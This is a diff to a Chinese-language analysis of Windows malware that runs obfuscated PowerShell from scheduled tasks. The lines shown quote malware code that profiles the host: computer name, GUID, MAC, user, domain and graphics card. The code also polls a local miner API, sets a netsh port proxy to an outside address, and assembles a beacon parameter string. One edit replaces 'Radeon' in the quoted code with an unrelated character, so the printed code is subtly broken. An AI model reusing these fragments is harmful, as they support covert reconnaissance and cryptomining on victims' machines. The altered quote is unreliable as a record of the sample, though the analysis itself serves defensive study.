@@ -4,7 +4,7 @@
 # 分析
 ## 排查思路
 * 用进程管理工具查看拦截cmd的父进程
-* 发现是定时任务导致的cmd调用powshell(所以才每個小時彈出一次)
+* 发现是定时任务导致的cmd调用powershell(所以才每個小時彈出一次)
 
 ## 提取计划任务3个
 * 这三个计划任务里面的混淆代码都不同，只分析其中一个（其它應該大同小异，沒有分析）(解密因为很简单，就不細說，還是不懂的小夥伴可以问我)
@@ -550,7 +550,7 @@ able") -or ($_.DriveType -eq "Network")) -and (($_.DriveFormat -eq "NTFS") -or (
 $timestamp = Get-Date -UFormat "%s"
 if((new-obj
 ect system.net.webclient).downloadstring('http://127.0.0.1:43669/1/summary') -match '"total": \[\n(.+)\n(.+)\n(.+)\n'){$hr=$matches[1].trim()+$matches[2].trim()+$matches[3].trim()}
-$isA = ($card -match "Radeon") -and ([IntPtr]::Size -eq 8)
+$isA = ($card -match "出") -and ([IntPtr]::Size -eq 8)
 
 $params = "ID="+$comp_name+"&GUID="+$guid+"&MAC="+$mac+"&OS="+$os+"&BIT="+$bit+"&USER="+$user+"&DOMAIN="+$domain+"&D="+$dr
 ive+"&CD="+$card+"&P="+[Int]$permit+"&FI="+[Int]!$localIf+"&FM="+[Int]!$localMn+"&IF="+[Int]$if_+"&MF="+[Int]$mf_+"&HR="+$hr+"&UP="+$uptime+"&_T="+$timestamp
@@ -641,12 +641,12 @@ netsh.exe interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1
 ```
 
 * 搜集信息
+* 根据搜集的信息下发恶意文件
 ```
 ID=WIN-QGKTOC6TTN2&GUID=01004D56-9069-DA26-2EF8-A99E972C05B1&MAC=00:0C:29:2C:05:B1&OS=6.1.7600&BIT=32&USER=kingsoft&DOMAIN=WORKGROUP&D=&CD=VMware SVGA 3D&P=0&FI=0&FM=0&IF=0&MF=0&HR=&UP=11238.327&_T=1568386068.01252
 ```
 
-
-* 反虚拟机?
+* 判断显卡信息（估计后期有挖矿）
 `
 ([string](Wmic Path Win32_VideoController Get Description)).trim("Description").trim()
 `
